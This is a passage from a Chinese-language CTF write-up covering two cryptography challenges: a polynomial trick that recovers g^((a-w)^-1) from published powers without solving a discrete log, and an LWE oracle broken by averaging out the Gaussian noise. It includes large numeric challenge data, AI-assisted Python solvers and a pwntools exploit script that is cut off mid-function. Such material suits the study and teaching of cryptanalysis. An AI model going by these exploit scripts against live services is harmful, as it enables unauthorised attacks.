43755795343332200283935793320395203653495032459154371222683611771489929623147377665033565782489463949552286242701682031803662548180153402710390994859g**(a**12)=537923048724306913667407759139091192645027606598311046000548547796991698984405486016463697946852730234553265033982453758097561723559435871028626304121501307482387420995739305402990605625514482774059358878453472977491682869062855937496286043123078558297311521808209090574271901886421438536457101475257587844454516455462087877211656574640247760256275523476747331878639859432764315245554388204289661687489841293394977800878056363245344564900463394368306785247423404g**(a**13)=51934925489063334787691610037014931455009887606610561005698200777907080694104820093865294502959771318908440224036860372440962333425683958284115243149646620909495838027781982845865942703574731265103534769824652022736262798167180403167801854693068724917191364493032544107480218634314594381331430403787813044675158312325080755018996909079697575467774620741120392160929982348047541052833075429981025030651220271486133138449231018092265633711192333262554599858975790g**(a**14)=1059964490529061044621075245304711172283591486685719943019579108698788079419318476702227133958427144632656851447006147314896029428313396097413692125262883169018066362511928680751967685741555993422295045796342490666810860026142323225352194442264842083457859123969012711367831112521263388612795861927778785730135795288931784680106041353116384313399571176514941720321869582402300524552855540517034209029475413412896665856894177364544381995125614424320466500734459871g**(a**15)=748385386217854935591238417343557224972257645351648875976502391496690810947305076266710823054183276352159275738637228330763370087767661401157158470945881293277204890742137584345215800941470815743527808133917953609613870580960746761392706596255693023985691720896911329242178574550812688838178481238489835231629746415143623476473598997000523012581793788842371211730882732900645357579058393975219277009174524520280511266408134112985441783868970923296165449587664923g**(a**16)=1144448615708305683367614959915199438212309537678412026397275803646472944907429096875465647722527428169614867535293295561711954517125913195674324280344197817048577981322088532198897041387229367290460448623051013498385132197917166310706467904805169182570304278296873874500462900394168265425958391676959509638562554823841219952130066338997665748730397359489630135907276115185691293970630133016237249884808857190097615154402892863133383178216245658051135961350643581g**(a**17)=519188105619163515401003905502167597210405994657781949994211268658972829772613733502880941470538036965280382486199640246526002493625019854634814417194664649304504058370312636801626139001046322181862501968236766929101150276749559428633534773907145224779284134475879841524833257902364126918908314133870646280667021943247767907697269197432112566419115037577760360119881815686746335810590470529897944196178121473754751278224110431476971810370910744758902056845129612g**(a**18)=935112938925517166210302846307923841118290311190122824544200250081783015165714029356660494494639204089140892705793060712560002233812928950051086675155848625903148508451801749411118374682074606612846386365909794972697988325020490051600999229672834676964401189555303543350462536636624292934168397551989066401993395896589081245536270379442859621475616301285689705122045639223646348735601311391993105745759121097908338402469382081260349161891803984169930653200685746g**(a**19)=548475273082982186157181212361100468189379734161575863840706276469937286657448242985373547915777881107373533384909353280565886826650779510963622704468591175047518154417154838959939350582232188280387401496582333797482451611435432489775253278296864886323232050190896555949513813594437903076591072997989600518824696385370916212349780132957000507160006094327270008443036471032102608363205734165931198836823681674747765717984189332825368849955328791192505235869020084g**(a**20)=551418139474283597501444419494433495198489650939051396736883923545642849344992850132684528803691695842949664145322978009676095728729002378360736423202281103078015710447676693409984728957044913008095174735761259428545095087464402068116543140388162970634210643236322006874993575260656444124679207665339803565254297121113876116665882766665547675863916077740268941755524701437422005179306355218810962660239513820551002058204053356297256869285906939172759640705574458g**(a**21)=502621180601298750146001307590253204130057827493515613021492222788958053941619170394876832814044143880887271964304058946389006311314544451768892655027096738574521410475122090066757563550995149053001732011656911982307921208045909677546877423707634933383842709714688256567184435090994887464645829108436950805846393513512559777091365041180986775236762647522055258709431530268694699038522542618923538862676400081514671231015216565519714130383251559145783658076138720g**(a**22)=590369198372118425912810991010485023815390035406147827833543423641107521223899254934435731382676078086864712057701855040827276458881688945884834913141481699135731341478968715703066400103137625865862188101361591773648336194531451507902183094338624872982832176863225243680756610197063501697402836184333636267798515181433534007384328264257757543920527787843744809153893603948991727649089001426544952810767692271627995856222566185074109407748401347488858544790874081g**(a**23)=936456359793313027616063607381869012793653415394241515387689721003705117368878095252583867106250359499949604552432632222785262345408354245846939624000323750136597189141725707744494566964377740738134990093048631149345764960238099823859472875118439081366423063323288111624196451952899261257101613483743704732997732497074377277839875521736763673456891987845034471103370287173410726486127140512476120487290664733302680415153887520218881361630116070608015521749986106g**(a**24)=876017570082281714452562562517192460475528856157405023231719832098441979971374776636785477720713179982594810879826104451343336951239688333676382042928408179525069918871773235509459222603444506933119199321932654845736928819272289564578859144747889338604656452298674151007468885266132083800958339974229722032133195901667326134336801006373888564193988091993775544155281225403417940576378334463527133721338436812145138349870834202524386397552299975535545468966709723g**(a**25)=960376978595267613144287493989799724447813083338682902878108553470543856544878091119077387567993120935576984733124138926452721851076431648275772852332287779949916239285783713112459128279462617423286271650197186898780986487093047743204502835716768627602821937663740885272653094223878423720148563569254453320773022433997089262819209065125663676836324224935646855434365398247947776544533847147820385991274387179052411067002687173444929606852953939230362582478395010g**(a**26)=66200087876254518536928624370696569002012793265298084876288094182852628438535829277583215180406761282898615642202024935576744758604404185203671550916851401268100298751280145218751431117902184159895675800216603268997090854153519463136195537685767019086978749337031375263951996786656572786095983123734611929316310027492381317803727408194599069722267246492421670888858669954731125135153911787522942719468579668064151616263961464490469749331485680868886931922419543g**(a**27)=738626174890972808654948227097907261548667257080118534725542687928649211520653485997481331562567396343462649117799083053838961381153791195444162894991103371779152957280970428258576948186508339356662429720726538516603943269958839071539959617733179811022475120940740123195676733990313550472268799571864041568807490920352481649899126872818752736715827969948069060992145624504152913762221355835587600808339435979712632311736590401599267898909113966238585918338714724g**(a**28)=1153271535924581584865912531724749863403952944584374600720665312148792901205701658353777893933249136553581284629818646765752113279282257190150565851900592891696805781797891943293488757716379760870439345710686267674624336460269375778043278672034664071105739412674372349585541378645380587643109198207913915889112423877115103898457139736432256280087852655730374486090130914611030772292584938245831847231281421517608954805508689358057555416468656644314739330891771031g**(a**29)=344901461096144427589313337546747849771160756250959061450006050796385595868221560845608237047221068425487831811411831825296962097097086388396996149337634844759366466727633494255074996462348072188317333476260292087432752948696100179896985764609897603721950508981254991262293580564361781625741402742804144078076972500046535791920605219483279996074303592650906168304363049685575340485274958152651513404257351358266622716733291100831407409336028601722820939182516040g**(a**30)=793673029460896041274559448248336092616717496749831152719812839109861483362272977453075324485303018789203875343899797950063380529181291244233016464073246395804422493935571322774152632011110138957740182122399867799407300461813519283846859078535262101606601728886109697525773295093495702177576564575582514537961268001574085894815685935623742131762892890761612141803803800502145632369726698300201238513257059379130421732587353875695453704922589136297719884486974025g**(a**31)=428772031776287493744087145031754991696569812226062610761799789298229338459221834830145099601453047413711969397548792333170088298734758902082335630779619674150343672393443954024121372765297950202859530605650576587065370060411262958488833009256886744366553719544310262293106501639334291948314028979506550154444321139711129553623008750609139908928385511354396556293002784347448717713780653481212021244181948581109238554291162066561086840975635769212375830418588207g**(a**32)=84856712940106742827524062220998120012440967380597883991358955796298526457311376380505605929724785451343348415993054273779507836372853593200442437140098269333363007640338496484744083087929008614743772135430950687378504182897502287479768182067788559420718218414834030437838199723232681051397059776431246002228293945595083742116766846037492664058767920226983165795624912301783529498348623501235354285374477982621667542272330037965600321997129457067893051477801604g**(a**33)=67959176885831100137525427303555428018736219245535597045450635734270064268576290803159652776939277843782871935621444121350187155061426824188600966037207694001470419141704677453432014302065263904722961845017540245686878384249852063339892492949814377762999068366027619323759826057027361535593083556036625938346815170479492128440685859436644717763618303905459273690242815409684580177212329616779008300967216682047980637888427753451288701407166654910077519851140556g**(a**34)=804103726363432192260118340952503171349862949065439294936483279716578602135164325758239694194987097420148353707615023938585091434207778705302611197781745716414903149888019266171059461070634615867076047713100333778133518057523330868956348377943369625608937844861826768025052057390921597717706795692044101174622962834491667267773285234212149579864645983043832882181953984427121670775287792315559244084606000031799735367104672509353593019388616521240910382110006396g**(a**35)=531875408711256942353413793058527894165133847151885797621970057983012043688378529303908786980751157249564573446671231264707861704125415717937403689971649527371556696615604156541734556536210054923675394510072854843732925485822929521090488870744899954252755657776501791014817182278554646928137253361598191617456265323040271077804299693527548084019393289641591004704626158616309814653031686252177629665385840455143086880112788273794745794187246380763220394887918939g**(a**36)=827445271740921355526699058045285395871466807915354333676929431949080042439537246197793572265170584598090101932759170709951175985620786463665577744886800077796531808526426998925787015356970789630573411118505387461200919292255435173194991514782973728212817530971330711298760895206982958857102219196783231336189873468273010411831769736140032994067354349287648338403843791730921196698852777331105775924622426292971718333706854023838824607577924640115751032397829970g**(a**37)=443090931570517831699639459175968330334741224680232681035120054045845163809889080534889222501520669666611409111321446063483465753584685264960581001888767886615965017242505306671063927023080654887281304810276101192956926894713627343813619366789038770613641907264635658091105348836931745524490666634572925096922819182697948202984665348293059629441575761171749021283082092941710494991638516438167348812429101772817749037541391729785751422351817676310812385805550587g**(a**38)=155248215849414225912461037949981608956128014326160654478003597965979982677461545230463382381206136744119807545562135420849979490833436828190378111387324848564504865827482221244915388634991394232762703089561054784189883876592698120228031216552136096405528397407215125957678160477176157621243892511272826912458654045182691852103414403259118403681030803864278813440054488946900094473067620413895347721647244717691313600912217829028513932124045659208672012907880030g**(a**39)=399845080198085797945702516393194696985604725913751282083546685460552459819220939115836450459937889426776731242168490586568194143825746525570954926451733597544652823627429697939871732958784578132865771299846927840862394385051731515291706868586541872828599511037294558084944373725411349473647947356672488468102147579400451475822400057598515338281788872329571050338401509518275207943713032674042000896490555476351057203398307904826491985993046958320704471424510973g**(a**40)=980210539885588169096390435467017261877974733122531504706590831886775630314164870768319893599896960147821836012739726380050053203765218407889473694173945795598872379374817234346104047224790925769266935555914614096363711337918259398881603334424055976401195687876077569494902246790578471586080314947182160282953288207765618098079462034737087098461177456318219063680629969646815247737604842428031309536119441112165816966919632162739700326917263084564777324653147503g**(a**41)=405644197879305978439098028411677849990382806393895795896375057488506843883312320546022267807344795869823423362015626855469592913627547333021290729644830761065619252952300948305371436060919199483101532348202879032687916676954260718927162838771661564140622477927427614164218413450773648633520200113983192262309991072742592077422413278144996694059066063030019924362091038211281658608848187656505772228837213406267701010643603299569090894003826881587172508203088600g**(a**42)=462397880377877250478643241519431833264009140574215681551875487431349800516205283725499900916796303275993189512286634500098379661596889697590344103077809011344732869138686353679676630437982800055810698496823827798800960288988076311949287027676368530806908044739007280464493557002153408089177602230726847113096082051799289946670255307049620223246700871774744837726277936388182394262038599792186009582464628800819437334618664008687810725096342615294705598886658450g**(a**43)=354949424597359862122250787814043050477698547148628596501477873578637363130297393837477089525877289512495446591705879014864055390509555552540750306844125802839558338765062448598562532447852652869554821223052468217773239420649380628776089904598947623230168726675278414037860915681843781508899886792493632222545792263714414596255249068425151101353361474472798292234618159453929910178914209610093490903397369156700153061743945663342346840445188261294785229528530844g**(a**44)=740119252506315644766028515696701569130434786355436104723808504805034786233335915229889313555501789611712266813495538727557134284138785600530812727320228468656287266295358090627710145827353658057205848500774761570687461066359089520224779185764614812111985288256493335430658959879714743008033989101678115807659714899452992317993448181603712047337011012166423332911413260245930001884795531443808116446484327766300829558040176341873275667767587138845629673443660740g**(a**45)=587444755599165037234544260959361900703267772818992941343456192977831869707326360848988621969395282889347827433121120544624972461462181931232625067352848999079109460414138643203147742240238970389247295361565823157032813784353099614430614800827758127579931880063518371346605577041774238929689798096176699945369680643326475263561188458474567379359110756280084868973208705153497352846938984111514989084539206462146446189203901960109248230793410504957558033397381891g**(a**46)=214950195981674255528510492090216374960348569295906671744974712971299106029003208993667001054206247502383530049028460477237701017692194753871833079539777396398323494018272883314465895354265088621266629516195583525431290173472730665183816814223360260994793676128499779597318427274974372517674801177039212690835398230686277561637312491718177523099574349512311947417146574083587982828230561551265966876669798442960465798732815834931780197155466262390837423916877989g**(a**47)=907692958855183650048720382902403853357765077137027494938810883600038809484763796470426511940415912851198923116365500287253269578203005493942056077450680396363271261626243221244931515669702948375996386010670693864786858713086075911203385251176386031908804568509481061347993122561503311012586222249962155912834667295538124606803960527275918000245528468670462853242516288323781169440456785589278032500817946684546306672783697003300673578575641376308219526758391043g**(a**48)=297683220662024877839207798482187870938723182974553380410862299251363956963542962780746098613606635176894638479247549026002980743169864533338193886525259860571735472053505784728435847340918622606542122109892520652154800527054096805994547745752172153604013201041842708349200213461861331818446933298587880334241202215410832954945890642642124277491632421565295343688943238291467333944442966488187798938023879891550950544237453987688388437756656363385723672988375252g**(a**49)=1003631491891180306573004210706225960617707425511295258191004462263767729554111769116239103344828703827490660113561892710125103577360768779966204439949269573561338711670174440253919586257636573828252756530329938054580861461730335920848612252580199542401617563380422567459471394717554132773878347723387145040604023073055895766942546532658374399234641069539876980731448310093816544507705343196961633423791885229249934743736451216760280064429225722237425609454612167g**(a**50)=325374987652087123036989880143325988658999945157707128756576635045690535744463268816197239707295541434297026587206313074994474448924690649910134293537592534067558743152889245183167161264866375745018775457217643071912156029183253899973160253079092310065847503747815072867351479215879423387999174953553280358467624190301160060047883247386281807287291602498546079052700329738732440368384507971451291591785861135886084258400667486133532339534516028456284444801596416g**(a**51)=1140476184297388138992406645699008127721817608298958874613261198040388630848767227415451150859083185004383099152797780818851917701682816420034250759051636516914368467193667684665291068700454460332809338732606409424966919394115140907078679849054662202219809711848541365481412125149042620129322730267248369172692362636454646567239266231078384932423220186646972630259332289783545755496225856485794385593380306703356739952499521138020590939976394312431012271533062665g**(a**52)=656312741735093616791054951932732287820326500731952413484616167778034303950991676857246724559014358401544803707575336473559409460959231147962128976609195358504369619204017952922870459009274270314136081580005233678119437792426114870065616248560083505986000948569253963561034767295827020663464884295522081502809068523159979854526004561825987620737631423006998054092036384010598069011791825175839076791058943952748040399449823430212199050992882386199179882027106616g**(a**53)=925172084650234952738055129778957670682933320881588358623389855877719415066724012348061915348588844367074877821288291471546865809225406454050290900416103255691782832536769141667375900811403278963963069581769084420480651253502278631464273437869971419790624746903323018195522774398943554633922280057975813568887038008674796493600062310584304894838026969119589236210360210152105225076251441729895376654827899192484699925258708251880634009071999891001867429943964032g**(a**54)=220250020897108805887206098533293919980124555685379538428378029139404569774745913427801360443291041129903871132458106872045155123984592998499304646177465142409089794299148829525910649148463095419652148816297866812539670932291323937749881388604494863155012320767252873274305405913278806229350053700428598121180160775562244970073589400191463043291403576236308017225795383941450561314077815059172111073697256386958899522056278956968623941773712561270948471728348710g**(a**55)=393999833495115547744681551803664476157560614643370934180974649057520760887228197708980306871084144622074373209895546623386926234343194859418743929159219548263037006225663531305489363796037564626406354331573994981953643304674151497358852540752175714852367759085323809266000562851287313655420658576145746795710907827427356171504066066802624192025178891852197765419647923140881785312535529967995088973500970722404979313479925311268572162960477419630943655965290372g**(a**56)=829282976613829241836360081395554852962732429607153704646645995307031916001802206305447266438419273931599615742369558644731811781283222164063932095191723020760155750380124576214149478913131869764550489069379913074649749664591153526027447084780769090354538835585753750366865198583836297508730095101638827662707791938686982107672906311674056680297949035001258977555414909327385886755258368047500773710872151223643117325192877894074180410746125027556896270138128665g**(a**57)=610819890290711468033475535094087815032949147974911400723601709023474981495189053152546688377535410651006266104524745849573586152275900525851625730261466480483243410583629704181870117770734008317355880683343660833765260975949030418394668747407456022493944462424120379353064369895731489808741165176887419680889657146998526426008360717267951925210739916408361024535363558785076769707251526759955257960865557465764244876530493147823927889718436331306593432838379040g**(a**58)=318850745582068097779943290144271530871137621466613932333191713300321180949000245282523790350013233634204171204482180938688204421810388715430302620535038145226777055603202924710958880874404286393108350181215699621303955091713089264754324219664838086626764514774417205006478813242227272390460118692998540056768207772858159577670993262673446886046570112261967502572948703163932936495072110278282834532853732874436047450667379801470723656269961237067528778510180755g**(a**59)=1122792721631351470179929182324553266448623427014373487882048645825575340837193808251659060043833466771113943725924580361858895767915264785381041897367348311966271017453566701517361243105352230452959260827542126639628111896847853563754758433397142676377584324635693500927803161749620609647535865366051098736833145574728087330523181070131784594904915887388010318332385819496967124027080196849770435064874582417928053271710324117954885741819791025860580166869815960g**(a**60)=1198341195044316977871293142286393468985061539560784855396424883808296494166708660945504068893587668488346383959074330675893985737312497384956111125543924790597238916500533233122584710378247668551965032541158560346678885690144633910593395591264594619938443339120666623751985506372809068009179674526796793769132184773316015300493965953608634939223836307127061546527291444586584697284666643882919027239606523828904492495459518536586842883059716593195840393204088268g**(a**61)=425613006174454621043040256283798129738903376549275431172623116813334328370671138733694287135573684854037043422367669347540891937462402284384310150467276819050998215941581994127886906102366435874080667918279564421990866766702894178060548736157209995837220432037559598911265870386231049369674261921711299656308862115458659269665301252327384357195152388593155730485786548023004515196181426599810975532272294482141394570759717376717932081093532174316791009087192119g**(a**62)=1003035821484901261398551405257709434421542836569858054683925336860426408559624782305239569732859961673418528110330262755197472197730343310060107852266015698863868354725824425032406970692489867105165902404146138825531577731445742495405487877113660208536628993739547743893098233580015527536150979545641900804510337891732921927222017790621240568285568139353659201082514818111445948666905967690976866166955546505804024932564594378772665772981409265343969893124310109g**(a**63)=37525322936755048315882119994559362887824342971957364906086459066339011954691340600895919441622827833793684131246886131195113253902782124645675128102681097754644053645764447407529941903076024968226413070562943759896139897262164803755034530007328563583568902686089984830282385017821806257814311115286981288779315869250980880272929717345006222576894352323284593217762659503032598327805075131463299906671253935914683123889561131874239272845599910332871027890790144f(x)=[3934037848507671313, 7163312440213743020, 1068067828677487962, 9616620236663402198, 14951618567612202523, 5334170476138375532, 14971011628799520066, 12470950981148026402, 16778289845018139910, 5075433041073653995, 10171366812423342519, 7134453661695517527, 1584005709598343161, 17210552426288878964, 2314627402522280395, 11362601988248461497, 13179596664295877028, 1358037207622978029, 6458206237141684189, 17568308030296233439, 17154706144454408109, 6875564471403626408, 1771604993142756552, 10339548719958797491, 14407467898400355560, 5599902096698060784, 4148799300143558141, 7345464900339496536, 17693994879008128495, 10766110118668126313, 12500034033305150349, 4457893228807565879, 14648055482349088869, 16315748015072253921, 6550449953921826664, 8057454229515379986, 11370550603309033686, 11678889446207658939, 18087211198918507041, 10948146701948076351, 10905595498702201889, 15444051280851702335, 7831774819340999530, 4480572439027389580, 236498351852774316, 17650395434174515592, 6116603661114741898, 15639816378402914561, 13088272613342466078, 3978133073068303466, 12764307904654676017, 14132959511909711831, 1306551887929068874, 7483942877683344008, 12997264192070987777, 1839571799345402709, 14255935456893399536, 6378166789705343797, 9401818515244771415, 8129855470171530502, 14567483947603058439, 17020853258928901347, 2051671117276556324, 1]w=40993545634119819077665955143471342240695426497061432211475913240267962059404198946360769569537631127237643976799614036958944381869519592837391556404040618139821571439843664787471723461677277303687445815567341782595991697961752411538123687502649593031958408998509020421824977151718636145450796900133369000294841463015409434396823741877746904263732441858346789161197665703554260326990098099688570528579836788994638224662614971618219698943181016106445651564642794g**(f(a)/(a-w))=394073585332862514268519676411808592018813469914740771725830965799163939991616455328992904840104904360794900299056676762474469741947032620742676750435958542254984866654529722552948877909416094454739676230767521159762137367060495586714410658098442773373837551670393617235158333332957413175914416775393732150819219678303508675579346387103469464645167722405250480108314561401565333158479779046794530078848275402942254471032678062752518876101637253141745052148198020\n凑数字小游戏（）ChatGPT比较擅长这个，它可以注意到p是一个安全素数（2*大质数+1），其中那个大质数就是q。同时，分解q也很困难，因此我们不能硬求离散对数，需要利用给出的$g^{a^i},\\,f(x),\\,w$和$g^{f(a)\\times(a-w)^{-1}}\\bmod p$，求解$\\text{ANS}=g^{(a-w)^{-1}}\\bmod p$。\nChatGPT注意到，因为$f(w)\\neq 0$，因此一定存在模q的逆元$f(w)^{-1}$，使得$A(x)=1-f(w)^{-1}\\times f(x)$在$x=w$处为0，因此$w$是该多项式的一个根，设剩余部分为$s(x)$，则有$s(x)(x-w)=1-f(w)^{-1}\\times f(x)$。由于$a=w$的概率极小，我们直接取$x=a$，则$(a-w)$有模q的逆元，即：\ns(a)(a-w)=1-f(w)^{-1}\\times f(a),\\;\\;s(a)=(a-w)^{-1}-f(w)^{-1}(a-w)^{-1}f(a)由于$A(x)$和$w$我们完全知道，因此我们知道$s(x)$可以如何拆解为若干个$a^i$，这样，我们有\ns(a)=\\sum^{63}_{i=0} c_ia^i=(a-w)^{-1}-f(w)^{-1}(a-w)^{-1}f(a)将两边作为g的指数，即\ng^{(a-w)^{-1}}= g^{\\sum^{63}_{i=0} c_ia^i}\\times (g^{f(a)\\times (a-w)^{-1}})^{f(w)^{-1}} = (\\prod^{63}_{i=0} (g^{a^i})^{c_i}) \\times (g^{f(a)\\times (a-w)^{-1}})^{f(w)^{-1}}这样我们就绕过了离散对数求解$a$的步骤，不需要$a$的具体值也求出了$\\text{ANS}$。\nfrom math import ceilfrom functools import reducedef modinv(x, m):    return pow(x, m-2, m) if m and (m &amp; 1) else pow(x, -1, m)def poly_mul(a, b, mod):    # multiply polynomials a,b (lists low-&gt;high)    res = [0]*(len(a)+len(b)-1)    for i, ai in enumerate(a):        for j, bj in enumerate(b):            res[i+j] = (res[i+j] + ai*bj) % mod    return resdef poly_add(a, b, mod):    n = max(len(a), len(b))    res = [0]*n    for i in range(n):        ai = a[i] if i &lt; len(a) else 0        bi = b[i] if i &lt; len(b) else 0        res[i] = (ai + bi) % mod    return resdef poly_scale(a, c, mod):    return [ (ai * c) % mod for ai in a ]def poly_sub(a, b, mod):    n = max(len(a), len(b))    res = [0]*n    for i in range(n):        ai = a[i] if i &lt; len(a) else 0        bi = b[i] if i &lt; len(b) else 0        res[i] = (ai - bi) % mod    return resdef poly_div_by_linear(numer, w, mod):    # divide numer(x) by (x - w) over F_mod, return quotient (assume remainder 0)    # numer and quotient represented as lists [c0, c1, ..., c_d] (low-&gt;high)    # synthetic division:    d = len(numer)-1    quot = [0]*d    # synthetic: start from highest coeff    cur = numer[-1]    quot[d-1] = cur    for i in range(d-1, 0, -1):        # next cur = numer[i-1] + cur * w        cur = (numer[i-1] + cur * w) % mod        quot[i-1] = cur    # after loop, remainder = numer[0] + cur * w mod mod    remainder = cur * w % mod    # Instead of risk, do straightforward polynomial long division for degree small:    # Simpler robust method below:    numer_copy = numer[:]    quot = [0]*(len(numer)-1)    for k in range(len(quot)-1, -1, -1):        coeff = numer_copy[k+1]        quot[k] = coeff        # subtract coeff*(x-w) shifted by k        numer_copy[k+1] = (numer_copy[k+1] - coeff) % mod        numer_copy[k] = (numer_copy[k] + coeff * w) % mod    if numer_copy[0] % mod != 0:        raise ValueError(&quot;Division remainder non-zero; check inputs&quot;)    return quot  # low-&gt;high, degree = len(numer)-2def compute_ANS_from_outputs(X_list, f_list, w, T, p, q):    # X_list length 64, f_list length 64    # Compute f(w) mod q:    fw = 0    poww = 1    for coeff in f_list:        fw = (fw + coeff * poww) % q        poww = (poww * w) % q    if fw % q == 0:        raise ValueError(&quot;fw == 0 (degenerate)&quot;)    t0 = modinv(fw, q)  # t0 = f(w)^&#123;-1&#125; mod q    # build polynomial 1 - t0 * f(x)  as list low-&gt;high    numer = [0]* (len(f_list)+1)    numer[0] = 1 % q    for i, coeff in enumerate(f_list):        numer[i] = (numer[i] - (t0 * coeff) ) % q    # numer currently length 65, but high coeff may be zero; reduce trailing zeros:    while len(numer) &gt; 1 and numer[-1] == 0:        numer.pop()    # divide numer by (x - w) to get s(x)    s_coeffs = poly_div_by_linear(numer, w % q, q)  # length up to 64-1 = 63    # compute g^&#123;s(a)&#125; via X_list and s_coeffs:    g_s_a = 1    for i, si in enumerate(s_coeffs):        if si % q == 0:            continue        g_s_a = (g_s_a * pow(X_list[i], si % q, p)) % p    # if s has constant term beyond s_coeffs length, check; poly_div_by_linear returns deg &lt;=62    # compute ANS = T^&#123;t0&#125; * g_s_a mod p    ANS = (pow(T, t0, p) * g_s_a) % p    return ANScompute_ANS_from_outputs(X_list, f_list, w, T, p, q)#在最后的调用中，X_list为g^a^i，f_list为f(x)，T为g**(f(a)/(a-w))\n04-Broadcast_1import random as random2import osfrom sage.all import *from sage.stats.distributions.discrete_gaussian_integer import DiscreteGaussianDistributionIntegerSampler as DGDISn=128p=31337D=DGDIS(sigma=1) #Generate the discrete gaussian distribution with sigma = 1flag=os.getenv(&#x27;GZCTF_FLAG&#x27;)+&#x27;&#x27;.join([random2.choice(&#x27;0123456789ABCDEGHJK&#x27;)for _ in range(n)])seedA=&#x27;&#x27;.join([random2.choice(&#x27;0123456789ABCDEFGHJK&#x27;) for _ in range(24)])print(&#x27;Public Seed:&#x27;+seedA)rng=random2.Random()rng.seed(seedA.encode())while(1):    A=matrix(Zmod(p),[[rng.randint(0,99) for _ in range(n)]for __ in range(n)])    if(A.rank()==n):        breakrng.seed(os.urandom(48))s=vector(Zmod(p),[rng.randrange(200,p-200,200)+ord(flag[i]) for i in range(n)])for i in range(548*2):    op=int(input(&#x27;Give me your choice&gt;&#x27;))    if(op==1):        e=vector(Zmod(p),[D() for _ in range(n)])        print(list(A*s+e))    else:        break\n一个简单的LWE加密，即已知$As+e=b$中的$A$和$b$，求解$s$。本题中可以获取多次加密，且每次$A$都不变，$s$也没有改变，因此可以利用这里$e$的统计学性质。$e$服从$\\sigma=1$的高斯分布，因此$e$的均值为0，且大量的$e$只是±1，2，3，4，收集足够多的加密，对$b$求平均即可消除$e$，得到纯净的$As=b’$，由于题目要求$A$满秩，故可以求得$s=A^{-1}b’$。\n以及我感觉sage肯定有相关的函数，只是AI不知道，没有用，导致矩阵求逆占了exp的好一部分，这对吗。\nimport sysimport astimport refrom pwn import remoteimport randomp = 31337n = 128QUERIES = 400# ---------------- modular linear algebra ----------------def mat_mod_inv(mat, p):    # mat: list of n rows, each row is list length n, elements ints 0..p-1    n = len(mat)    # build augmented matrix [mat | I]    aug = [ [ (mat[i][j] % p) for j in range(n) ] + [1 if i==j else 0 for j in range(n)] for i in range(n) ]    # Gaussian elimination    for col in range(n):        # find pivot        pivot = None        for r in range(col, n):            if aug[r][col] % p != 0:                pivot = r; break        if pivot is None:            raise ValueError(&quot;singular&quot;)        # swap        if pivot != col:            aug[col], aug[pivot] = aug[pivot], aug[col]        inv_pivot = pow(aug[col][col], -1, p)        # normalize pivot row        for j in range(2*n):            aug[col][j] = (aug[col][j] * inv_pivot) % p        # eliminate other rows        for r in range(n):            if r == col: continue            factor = aug[r][col]            if factor % p == 0: continue            for j in range(col, 2*n):                aug[r][j] = (aug[r][j] - factor * aug[col][j]) % p    # extract inverse    inv = [ row[n:] for row in aug ]    return invdef mat_vec_mul(mat, vec, p):    n = len(mat)    return [ sum((mat[i][j]*vec[j]) for j in range(n)) % p for i in range(n) ]# ---------------- estimate b per-coordinate from many samples ----------------def estimate_b_from_samples(coord_samples, p):    # coord_samples: list of integers in 0..p-1 (may contain duplicates)    if not coord_samples:        return 0    # work with raw samples but compute unique sorted list for gap detection    uniq = sorted(set(coord_samples))    if len(uniq) == 1:        return uniq[0]    # find largest gap in circular sorted list    max_gap = -1    max_idx = -1    for i in range(len(uniq)-1):        gap = uniq[i+1] - uniq[i]        if gap &gt; max_gap:            max_gap = gap; max_idx = i    # wrap gap    wrap_gap = (uniq[0] + p) - uniq[-1]    if wrap_gap &gt; max_gap:        max_gap = wrap_gap        max_idx = len(uniq)-1    # cluster is the sequence after the largest gap    start = (max_idx + 1) % len(uniq)    cluster_vals = []    i = start    while True:        cluster_vals.append(uniq[i])        i = (i+1) % len(uniq)        if i == start:            break    arc_min = cluster_vals[0]    arc_max = cluster_vals[-1]    # map each original sample into integer rep inside arc by shifting by k*p    lifted = []    # choose center of arc for closeness    arc_center = (arc_min + ((arc_max - arc_min) // 2)) % p    for v in coord_samples:        # try shifts -1,0,1        choices = [v, v + p, v - p]        # pick representative closest to arc_center (in integer line)        best = min(choices, key=lambda x: abs(x - arc_center))        lifted.append(best)    # compute median of lifted values for robustness    lifted.sort()    L = len(lifted)    if L % 2 == 1:        est = lifted[L//2]    else:        est = (lifted[L//2 - 1] + lifted[L//2]) // 2    return int(est % p)# ---------------- reproduce A from Public Seed ----------------def reproduce_A(seedA):    rng = random.Random()    rng.seed(seedA)    while True:        A = [[rng.randint(0,99) for _ in range(n)] for __ in range(n)]        # quick check: try to invert mod p        try:            _ = mat_mod_inv(A, p)            return A        except Exception:            # not invertible, continue            continue# ---------------- parse a python-style list from remote output ----------------def extract_list_from_bytes(b):    # try to find the first [...] substring and parse    m = re.search(rb&#x27;\\[[\\s\\S]*?\\]&#x27;, b)    if not m:        return None    s = m.group(0).decode()    try:        L = ast.literal_eval(s)        return [int(x) % p for x in L]    except Exception:        return None# ---------------- main exploit ----------------def main():    if len(sys.argv) != 2:        print(&quot;Usage: python3 exploit_pwntools_lwe.py HOST PORT&quot;)        return    host = sys.argv[1]    port = int(sys.argv[2])    print(f&quot;Connecting to &#123;host&#125;:&#123;port&#125; ...&quot;)    r = remote(host, port, timeout=10)    seedA = r.recvline().split(b&#x27;:&#x27;)[-1].strip()    print(&quot;Reproducing A from Public Seed... (may take a moment)&quot;)    A = reproduce_A(seedA)    print(&quot;A reproduced. Inverting A mod p...&quot;)    Ainv = mat_mod_inv(A, p)    print(&quot;A inverse computed.&quot;)    samples = []    for i in range(QUERIES):        # wait for prompt; be resilient        try:            r.recvuntil(b&#x27;Give me your choice&gt;&#x27;, timeout=5)        except Exception:            # maybe prompt not exactly matching; continue anyway            pass        r.sendline(b&#x27;1&#x27;)        # read until we can extract a list        data = b&#x27;&#x27;        got = None        for _ in range(10):            try:                chunk = r.recvuntil(b&#x27;]&#x27;, timeout=3)            except Exception:                try:                    chunk = r.recv(timeout=3)                except Exception:                    chunk = b&#x27;&#x27;            data += chunk            got = extract_list_from_bytes(data)            if got is not None:                break        if got is None:            print(f&quot;Failed to parse sample &#123;i&#125;&quot;)            return        if len(got) != n:            print(f&quot;Sample length unexpected: &#123;len(got)&#125;&quot;)            return        samples.append(got)        if (i+1) % 20 == 0:            print(f&quot;Collected &#123;i+1&#125;/&#123;QUERIES&#125; samples&quot;)    print(&quot;Collected samples, estimating b per-coordinate...&quot;)    coord_samples = [ [] for _ in range(n) ]    for s in samples:        for i, val in enumerate(s):            coord_samples[i].append(val)    b_est = [ estimate_b_from_samples(coord_samples[i], p) for i in range(n) ]    print(&quot;Estimated b vector.&quot;)    print(&quot;Computing s = A^&#123;-1&#125; * b (mod p) ...&quot;)    s_est = mat_vec_mul(Ainv, b_est, p)  